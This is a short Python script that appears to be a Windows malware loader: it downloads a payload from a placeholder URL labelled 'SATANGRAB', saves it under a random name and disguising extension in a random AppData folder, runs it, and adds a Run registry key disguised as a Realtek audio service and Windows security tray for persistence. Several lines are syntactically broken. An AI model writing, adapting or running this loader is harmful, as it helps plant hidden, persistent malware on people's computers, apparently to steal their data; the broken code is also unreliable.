from sys import executable
from urllib import request
from os import getenv, system, name, listdir
from os.path import isfile
import winreg
from random import choice

if name != 'nt': 
    exit()

def getPath():
    path = choice([getenv("APPDATA"), getenv("LOCALAPPDATA")])
    directory = listdir(path)
    for  in range(10):
        chosen = choice(directory)
        ye = path + "\" + chosen
        if not isfile(ye) and " " not in chosen:
            return ye
    return getenv("TEMP")

def getName():
    firstName = ''.join(choice('bcdefghijklmnopqrstuvwxyz') for  in range(8))
    lasName = ['.dll', '.png', '.jpg', '.gay', '.ink', '.url', '.jar', '.tmp', '.db', '.cfg']
    return firstName + choice(lasName)


def install(path):
    with open(path, mode='w', encoding='utf-8') as f:
        f.write(request.urlopen("SATANGRAB").read().decode("utf8"))

def run(path):
    system(f"start {executable} {path}")

def startUP(path):
    faked = 'SecurityHealthSystray.exe'
    address = f"{executable} {path}"
    key1 = winreg.HKEY_CURRENTUSER
    key2 = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    open = winreg.CreateKeyEx(key1, key2, 0, winreg.KEYWRITE)
    winreg.SetValueEx(open, "Realtek HD Audio Universal Service", 0, winreg.REG_SZ, f"{faked} & {address}")



DoYouKnowTheWay = getPath() + '\' + getName()
install(DoYouKnowTheWay)
run(DoYouKnowTheWay)
try:
    startUP(DoYouKnowTheWay)
except:
    pass
